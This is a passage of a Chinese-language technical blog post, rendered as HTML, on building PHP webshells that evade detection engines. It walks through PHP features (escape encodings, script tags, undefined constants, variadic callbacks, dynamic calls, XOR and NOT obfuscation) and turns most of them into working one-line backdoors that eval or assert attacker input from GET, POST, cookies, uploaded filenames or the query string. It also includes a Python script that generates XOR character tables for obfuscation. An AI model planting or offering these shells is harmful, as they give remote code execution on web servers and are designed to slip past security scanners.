+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2799">利用动态二进制加密实现新型一句话木马之客户端篇 - 先知社区 (aliyun.com)</a></p>
+</li>
+</ul>
+<p>魔改 - 哥斯拉：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qnrizGo_B12RzmEF6nePDA">巧用Zeek在流量层狩猎哥斯拉Godzilla (qq.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2020/12/12/Godzilla/">后门加密通信分析：HITCTF 2020 Godzilla | Clang裁缝店 (xuanxuanblingbling.github.io)</a></li>
+</ul>
+</blockquote>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/CEHgJ54GSy3oU9p.png" alt="image-20211217145042051"></p>
+<h2 id="PHP语法特性"><a href="#PHP语法特性" class="headerlink" title="PHP语法特性"></a>PHP语法特性</h2><h3 id="PHP字符串的转义表示"><a href="#PHP字符串的转义表示" class="headerlink" title="PHP字符串的转义表示"></a>PHP字符串的转义表示</h3><ul>
+<li>八进制表示：<code>\[0-7]&#123;1,3&#125;</code>（如：”a” === “\141”）</li>
+<li>十六进制表示：<code>\x[0-9A-Fa-f]&#123;0,2&#125;</code>（如”a” === “\x61”）</li>
+<li>Unicode表示：<code>\u&#123;[0-9A-Fa-f]+&#125;</code>（如”a” === “\u{0061}”）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;a&quot;</span> === <span class="string">&quot;\141&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;True &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;a&quot;</span> === <span class="string">&quot;\x61&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;True &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;a&quot;</span> === <span class="string">&quot;\141&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;True &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;a&quot;</span> === <span class="string">&quot;\u&#123;0061&#125;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;True &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：True True True True</span></span><br></pre></td></tr></table></figure>
+<h3 id="PHP的不同标记风格"><a href="#PHP的不同标记风格" class="headerlink" title="PHP的不同标记风格"></a>PHP的不同标记风格</h3><p>PHP有如下几种标记风格：</p>
+<ul>
+<li>标准风格：<code>&lt;?php ... ?&gt;</code></li>
+<li>简短风格：<code>&lt;? ... ?&gt;</code></li>
+<li>脚本风格：<code>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;</code>（PHP7后被移除）</li>
+<li>ASP风格： <code>&lt;% ... %&gt;</code>（默认不开启，PHP7后被移除）</li>
+</ul>
+<p>PHP-Parser只支持前两个标签，传入一个由 <code>&lt;script&gt;</code> 标签构造的 <code>Webshell</code> ，不识别该标签的检测引擎就会出现绕过。</p>
+<h3 id="PHP对未定义字符串的处理"><a href="#PHP对未定义字符串的处理" class="headerlink" title="PHP对未定义字符串的处理"></a>PHP对未定义字符串的处理</h3><p>将其直接强行转换成字符串，然后结合PHP可变函数进行利用，绕过单/双引号。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	var_dump(test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line">Warning: <span class="keyword">Use</span> <span class="title">of</span> <span class="title">undefined</span> <span class="title">constant</span> <span class="title">test</span> - <span class="title">assumed</span> &#x27;<span class="title">test</span>&#x27; (<span class="title">this</span> <span class="title">will</span> <span class="title">throw</span> <span class="title">an</span> <span class="title">Error</span> <span class="title">in</span> <span class="title">a</span> <span class="title">future</span> <span class="title">version</span> <span class="title">of</span> <span class="title">PHP</span>) <span class="title">in</span> <span class="title">D</span>:\<span class="title">Work</span>\<span class="title">Web</span>\<span class="title">phpstudy_pro</span>\<span class="title">www</span>\<span class="title">test</span>\<span class="title">test</span>.<span class="title">php</span> <span class="title">on</span> <span class="title">line</span> 2</span><br><span class="line"><span class="title">string</span>(4) &quot;<span class="title">test</span>&quot;</span><br></pre></td></tr></table></figure>
+<p>在Web应用全局过滤单/双引号的环境下，把后门代码留在某个Controller下，可以使用这个特性避免单双引号。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PASS = <span class="keyword">eval</span>(<span class="string">&#x27;print(1)&#x27;</span>);</span><br><span class="line">等价于：</span><br><span class="line">PASS = <span class="keyword">eval</span>(base64_decode(cHJpbnQoMSk=));</span><br></pre></td></tr></table></figure>
+<h3 id="PHP内建函数-get-defined-functions"><a href="#PHP内建函数-get-defined-functions" class="headerlink" title="PHP内建函数 get_defined_functions"></a>PHP内建函数 get_defined_functions</h3><p>PHP自带的<code>get_defined_functions</code>函数包含了所有PHP内建及用户自定义的函数，内建函数会放在<code>internal</code>键中，而用户自定义函数会放在<code>user</code>中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is my function foo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = get_defined_functions();</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [internal] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; zend_version</span><br><span class="line">            [<span class="number">1</span>] =&gt; func_num_args</span><br><span class="line">            [<span class="number">2</span>] =&gt; func_get_arg</span><br><span class="line">            …… ……</span><br><span class="line">			[<span class="number">1098</span>] =&gt; openssl_pkey_derive</span><br><span class="line">            [<span class="number">1099</span>] =&gt; openssl_random_pseudo_bytes</span><br><span class="line">            [<span class="number">1100</span>] =&gt; openssl_error_string</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [user] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; foo</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>可以使用<code>get_defined_functions[&#39;internal&#39;][xx]</code>获取特定的函数，如<code>assert</code>、<code>create_function</code>等，绕过语义分析中的sink点黑名单。</p>
+<h3 id="PHP通过define-定义常量数组"><a href="#PHP通过define-定义常量数组" class="headerlink" title="PHP通过define()定义常量数组"></a>PHP通过define()定义常量数组</h3><p>Array类型的常量现在可以通过<code>define()</code>来定义。在PHP5.6中仅能通过<code>const</code>定义。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 使用 const 关键字定义的常量总是大小写敏感的，而使用 define() 函数定义的常量可能不区分大小写。</span></span><br><span class="line"><span class="comment">// 使用 const 关键字定义常量必须处于最顶端的作用域，因为用此方法是在编译时定义的。这就意味着不能在函数内。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下代码在PHP 5.3.0 后可以正常工作</span></span><br><span class="line"><span class="keyword">const</span> CONSTANT = <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> CONSTANT;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;	<span class="comment">// 输出 &quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP 5.6.0 后的写法</span></span><br><span class="line"><span class="keyword">const</span> ANOTHER_CONST = CONSTANT.<span class="string">&quot;;Goodbye World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> ANOTHER_CONST;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;	<span class="comment">// 输出 &quot;Hello World;Goodbye World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ANIMALS_1 = <span class="keyword">array</span>(<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> ANIMALS_1[<span class="number">1</span>];	<span class="comment">// 将输出 &quot;cat&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP 7 中的写法</span></span><br><span class="line">define(<span class="string">&#x27;ANIMALS_2&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;dog&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;bird&#x27;</span></span><br><span class="line">));</span><br><span class="line"><span class="keyword">echo</span> ANIMALS_2[<span class="number">1</span>];	<span class="comment">// 将输出 &quot;cat&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="PHP返回值类型声明"><a href="#PHP返回值类型声明" class="headerlink" title="PHP返回值类型声明"></a>PHP返回值类型声明</h3><p>PHP 7 增加了对返回值类型声明的支持。类似与参数类型的声明，返回类型的声明指明了函数返回值的类型。可用的类型与参数声明中可用的类型相同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>):<span class="title">int</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就是函数返回值类型为int。否则会强制转换或者显示语法错误。如果未更新此特性的查杀软件，就不会认识此函数，导致被绕过。</p>
+<h3 id="全局变量-参数传递"><a href="#全局变量-参数传递" class="headerlink" title="全局变量-参数传递"></a>全局变量-参数传递</h3><h4 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h4><h5 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h5><p>用来获取由浏览器通过GET方法提交的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h5><p>用来获取由浏览器通过POST方法提交的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h5><p>用来获取由浏览器通过POST方法提交的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h5><p>用来获取由浏览器COOKIE中的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$a</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	assert(urldecode(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h5><p>用来获取通过 POST 方法上传文件的相关信息。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;test.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;userfile&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Send File&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="variable">$_FILES</span>[userfile][name];</span><br><span class="line">	<span class="keyword">eval</span>(base64_decode(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里上传的文件名就是我们的payload（base64编码后），发送后便可执行代码。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/qSyN3PFuedRtVHQ.png" alt="image-20211217221334960"></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/21/z6dhiMseAfrD8P9.png" alt="image-20211221215952226"></p>
+<h5 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h5><p>包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">eval</span>(substr(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>],<span class="number">4</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<h5 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h5><p>是一个包含服务器端环境变量的数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">eval</span>(substr(<span class="variable">$_ENV</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>],<span class="number">4</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：需要修改php.ini文件的 variables_order值为<code>EGPCS</code>（默认为<code>GPCS</code>）</p>
+<p><code>EGPCS</code>是<code>Environment</code>、<code>Get</code>、<code>Post</code>、<code>Cookies</code>、<code>Server</code>的缩写</p>
+</blockquote>
+<h4 id="GLOBALS全局变量"><a href="#GLOBALS全局变量" class="headerlink" title="$GLOBALS全局变量"></a>$GLOBALS全局变量</h4><p>$GLOBALS的作用是引用全局作用域中可用的全部变量。</p>
+<ul>
+<li><code>$GLOBAL[&#39;_GET&#39;]</code> ==  <code>$_GET</code></li>
+<li><code>$GLOBAL[&#39;_POST&#39;]</code> ==  <code>$_POST</code></li>
+<li><code>$GLOBAL[&#39;_REQUEST&#39;]</code> ==  <code>$_REQUEST</code></li>
+<li><code>$GLOBAL[&#39;_COOKIE&#39;]</code> ==  <code>$_COOKIE</code></li>
+<li><code>$GLOBAL[&#39;_FILE&#39;]</code> ==  <code>$_FILE</code></li>
+<li><code>$GLOBAL[&#39;_SERVER&#39;]</code> ==  <code>$_SERVER</code></li>
+<li><code>$GLOBAL[&#39;_ENV&#39;]</code> ==  <code>$_ENV</code></li>
+</ul>
+<p>使用方法与超全局变量一样</p>
+<h3 id="PHP变长参数"><a href="#PHP变长参数" class="headerlink" title="PHP变长参数"></a>PHP变长参数</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration56.new-features.php">变长参数</a>是PHP5.6新引入的特性。</p>
+<p>和Python中的<code>**kwargs</code>，类似。在PHP中可以使用<code>func(...$arr)</code>这样的方式，将$arr数组展开成多个参数传入func函数。</p>
+<p>可以结合回调函数构造WebShell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> usort(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//  ?1[]=1-1&amp;1[]=eval($_POST[&#x27;x&#x27;])&amp;2=assert</span></span><br><span class="line"><span class="comment">// [POST] x=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/18/WVBHF1z43Db2gKw.png" alt="image-20211218214601169"></p>
+<blockquote>
+<p>注：PHP7不允许assert函数通过动态函数回调</p>
+</blockquote>
+<h3 id="PHP7下表达式执行顺序"><a href="#PHP7下表达式执行顺序" class="headerlink" title="PHP7下表达式执行顺序"></a>PHP7下表达式执行顺序</h3><p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/18/q9kgiTbWS5pQYla.png" alt="image-20211218215505848"></p>
+<p>PHP7之前是不允许用<code>($a)();</code>这样的方式来执行动态函数的，但PHP7中增加了对此的支持，利用这个特性执行<code>phpinfo()</code>的多种方式如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ((<span class="string">&quot;phpinfo&quot;</span>))();</span><br><span class="line">	(<span class="string">&#x27;phpinfo&#x27;</span>)()</span><br><span class="line">	<span class="string">&quot;phpinfo&quot;</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="异或取反运算"><a href="#异或取反运算" class="headerlink" title="异或取反运算"></a>异或取反运算</h3><p>该利用方式是通过 “ ^ “( 异或运算符 ) 和 “ ! “( 取反运算符 ) 组成一个WebShell。</p>
+<h4 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;!&#x27;</span>^<span class="string">&#x27;@&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;[&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;[&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;@&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;)&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;+&#x27;</span>^<span class="string">&#x27;&#123;&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;&#123;&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;|&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// [POST] _=phpinfo()    </span></span><br></pre></td></tr></table></figure>
+<p>可以使用国光师傅写的一个脚本生成一个异或结果字典：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">keys = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">91</span>,<span class="number">97</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">123</span>,<span class="number">127</span>))</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        asscii_number = i^j</span><br><span class="line">        <span class="keyword">if</span> (asscii_number &gt;= <span class="number">65</span> <span class="keyword">and</span> asscii_number &lt;= <span class="number">90</span>) <span class="keyword">or</span> (asscii_number &gt;= <span class="number">97</span> <span class="keyword">and</span> asscii_number &lt;= <span class="number">122</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> =  <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &gt;=<span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &gt;= <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line"></span><br><span class="line">results.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> low_case <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> low_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> upper_case <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> upper_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+<p>脚本运行效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xxx.py &gt; results.txt</span><br></pre></td></tr></table></figure>
+<p>最终会生成1k多条结果，并按顺序排列。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/22/yhPbvXI1RU9QDOj.png" alt="image-20211222215134978"></p>
+<h4 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h4><p>与异或运算有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p>
+<p>这里利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p>
